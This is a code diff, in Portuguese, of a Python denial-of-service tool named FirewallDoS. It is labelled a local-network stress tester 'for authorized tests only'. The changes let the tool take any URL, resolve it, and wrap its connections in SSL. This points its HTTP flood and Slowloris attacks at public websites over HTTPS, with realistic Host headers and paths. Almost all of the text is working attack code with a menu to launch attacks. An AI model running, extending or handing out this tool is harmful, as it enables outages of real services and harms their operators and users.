@@ -10,17 +10,22 @@ import time
 import random
 import sys
 import ipaddress
+import urllib.parse
 from datetime import datetime
 
 class FirewallDoS:
     def __init__(self):
-        self.target_ip = None
+        self.target = None  # Pode ser IP ou URL
+        self.target_ip = None  # Resolvido a partir da URL
         self.target_port = None
+        self.target_path = "/"
+        self.target_host = None
         self.thread_count = 100
         self.attack_running = False
         self.requests_sent = 0
         self.attack_duration = 0
         self.attack_type = "TCP SYN"
+        self.use_ssl = False
         self.user_agents = [
             "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
             "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
@@ -38,7 +43,7 @@ class FirewallDoS:
 ╚═╝     ╚═╝╚═╝  ╚═╝╚══════╝ ╚══╝╚══╝ ╚═╝  ╚═╝╚══════╝╚══════╝
 \033[0m
 \033[93m╔══════════════════════════════════════════════════════════════╗
-║   FERRAMENTA DE TESTE DE ESTRESSE EM REDE LOCAL - v2.0      ║
+║   FERRAMENTA DE TESTE DE ESTRESSE EM REDE LOCAL - v2.1      ║
 ║        Uso exclusivo para testes autorizados                ║
 ╚══════════════════════════════════════════════════════════════╝\033[0m
 """
@@ -64,13 +69,40 @@ class FirewallDoS:
         except ValueError:
             return False
 
+    def parse_url(self, url):
+        """Analisa a URL e extrai host, porta, caminho e determina se é HTTPS"""
+        if not url.startswith(('http://', 'https://')):
+            url = 'http://' + url
+            
+        parsed = urllib.parse.urlparse(url)
+        
+        self.target_host = parsed.netloc.split(':')[0]
+        self.target_path = parsed.path if parsed.path else "/"
+        
+        # Resolve o host para IP
+        try:
+            self.target_ip = socket.gethostbyname(self.target_host)
+        except socket.gaierror:
+            print(f"\033[91m[!] Não foi possível resolver o host: {self.target_host}\033[0m")
+            return False
+        
+        # Determina a porta
+        if parsed.port:
+            self.target_port = parsed.port
+        else:
+            self.target_port = 443 if parsed.scheme == 'https' else 80
+        
+        self.use_ssl = parsed.scheme == 'https'
+        
+        return True
+
     def show_menu(self):
         while True:
             self.print_banner()
             print("\n\033[94m╔══════════════════════════════════════════════════════════════╗")
             print("║                         MENU PRINCIPAL                         ║")
             print("╠══════════════════════════════════════════════════════════════╣")
-            print("║ 1. Configurar Alvo                                            ║")
+            print("║ 1. Configurar Alvo (IP ou URL)                                ║")
             print("║ 2. Configurar Método de Ataque                                ║")
             print("║ 3. Configurar Parâmetros                                     ║")
             print("║ 4. Iniciar Ataque                                            ║")
@@ -103,21 +135,30 @@ class FirewallDoS:
         print("║                   CONFIGURAR ALVO                              ║")
         print("╚══════════════════════════════════════════════════════════════╝\033[0m")
         
-        while True:
-            ip = input("\n[+] IP do alvo: ").strip()
-            if self.validate_ip(ip):
-                self.target_ip = ip
-                break
-            else:
-                print("\033[91m[!] Endereço IP inválido. Tente novamente.\033[0m")
+        target = input("\n[+] Endereço do alvo (IP ou URL): ").strip()
         
-        while True:
-            port = input("[+] Porta do alvo (1-65535): ").strip()
-            if self.validate_port(port):
-                self.target_port = int(port)
-                break
-            else:
-                print("\033[91m[!] Porta inválida. Deve ser entre 1 e 65535.\033[0m")
+        # Se for um IP válido
+        if self.validate_ip(target):
+            self.target = target
+            self.target_ip = target
+            self.target_host = target
+            
+            # Pede a porta separadamente para IPs
+            while True:
+                port = input("[+] Porta do alvo (1-65535): ").strip()
+                if self.validate_port(port):
+                    self.target_port = int(port)
+                    break
+                else:
+                    print("\033[91m[!] Porta inválida. Deve ser entre 1 e 65535.\033[0m")
+            
+            self.use_ssl = False
+        else:
+            # Trata como URL
+            self.target = target
+            if not self.parse_url(target):
+                input("\n[Pressione Enter para tentar novamente...")
+                return
         
         print("\n\033[92m[+] Alvo configurado com sucesso!\033[0m")
         time.sleep(1)
@@ -177,18 +218,24 @@ class FirewallDoS:
         print("\n\033[94m╔══════════════════════════════════════════════════════════════╗")
         print("║                   CONFIGURAÇÃO ATUAL                           ║")
         print("╠══════════════════════════════════════════════════════════════╣")
-        print(f"║ Alvo: {self.target_ip if self.target_ip else 'Não configurado':<45} ║")
+        print(f"║ Alvo: {self.target if self.target else 'Não configurado':<45} ║")
+        print(f"║ IP Resolvido: {self.target_ip if self.target_ip else 'Não resolvido':<40} ║")
         print(f"║ Porta: {self.target_port if self.target_port else 'Não configurado':<44} ║")
+        print(f"║ Host HTTP: {self.target_host if self.target_host else 'Não configurado':<40} ║")
         print(f"║ Método: {self.attack_type:<43} ║")
         print(f"║ Threads: {self.thread_count:<43} ║")
+        print(f"║ SSL: {'Sim' if self.use_ssl else 'Não':<46} ║")
         print("╚══════════════════════════════════════════════════════════════╝\033[0m")
         
         input("\n[Pressione Enter para voltar...")
 
     def generate_http_payload(self):
-        path = '/' + ''.join(random.choices('abcdefghijklmnopqrstuvwxyz0123456789', k=random.randint(3, 10)))
+        path = self.target_path
+        if random.random() > 0.7:  # 30% de chance de usar um caminho aleatório
+            path = '/' + ''.join(random.choices('abcdefghijklmnopqrstuvwxyz0123456789', k=random.randint(3, 10)))
+        
         return (f"GET {path} HTTP/1.1\r\n"
-                f"Host: {self.target_ip}\r\n"
+                f"Host: {self.target_host}\r\n"
                 f"User-Agent: {random.choice(self.user_agents)}\r\n"
                 f"Accept: */*\r\n"
                 f"Connection: keep-alive\r\n\r\n").encode()
@@ -221,10 +268,16 @@ class FirewallDoS:
                 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                 s.settimeout(2)
                 s.connect((self.target_ip, self.target_port))
+                
+                if self.use_ssl:
+                    import ssl
+                    context = ssl.create_default_context()
+                    s = context.wrap_socket(s, server_hostname=self.target_host)
+                
                 s.send(self.generate_http_payload())
                 self.requests_sent += 1
                 s.close()
-            except:
+            except Exception as e:
                 pass
 
     def slowloris_attack(self):
@@ -238,7 +291,13 @@ class FirewallDoS:
                     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                     s.settimeout(4)
                     s.connect((self.target_ip, self.target_port))
-                    s.send(f"GET / HTTP/1.1\r\nHost: {self.target_ip}\r\n".encode())
+                    
+                    if self.use_ssl:
+                        import ssl
+                        context = ssl.create_default_context()
+                        s = context.wrap_socket(s, server_hostname=self.target_host)
+                    
+                    s.send(f"GET {self.target_path} HTTP/1.1\r\nHost: {self.target_host}\r\n".encode())
                     sockets.append(s)
                     self.requests_sent += 1
                 except:
@@ -271,7 +330,9 @@ class FirewallDoS:
             return
 
         self.print_banner()
-        print(f"\n\033[91m[+] INICIANDO ATAQUE {self.attack_type} CONTRA {self.target_ip}:{self.target_port}\033[0m")
+        print(f"\n\033[91m[+] INICIANDO ATAQUE {self.attack_type} CONTRA {self.target} ({self.target_ip}:{self.target_port})\033[0m")
+        if self.target_host:
+            print(f"[+] Host HTTP: {self.target_host}")
         print(f"[+] Usando {self.thread_count} threads")
         print("[+] Pressione Ctrl+C para parar o ataque\n")
 
@@ -299,7 +360,7 @@ class FirewallDoS:
         try:
             while True:
                 elapsed = time.time() - start_time
-                print(f"\r[+] Pacotes enviados: {self.requests_sent} | Taxa: {int(self.requests_sent/elapsed)}/seg", end='')
+                print(f"\r[+] Pacotes/enviados: {self.requests_sent} | Taxa: {int(self.requests_sent/elapsed)}/seg", end='')
                 time.sleep(0.5)
         except KeyboardInterrupt:
             self.attack_running = False
@@ -311,9 +372,9 @@ class FirewallDoS:
             
             elapsed = time.time() - start_time
             print(f"\n[+] Ataque concluído!")
-            print(f"[+] Total de pacotes enviados: {self.requests_sent}")
+            print(f"[+] Total de pacotes/requisições enviados: {self.requests_sent}")
             print(f"[+] Duração: {elapsed:.2f} segundos")
-            print(f"[+] Taxa média: {int(self.requests_sent/elapsed)} pacotes/segundo")
+            print(f"[+] Taxa média: {int(self.requests_sent/elapsed)} requisições/segundo")
             input("\n[Pressione Enter para voltar...")
 
 if __name__ == "__main__":
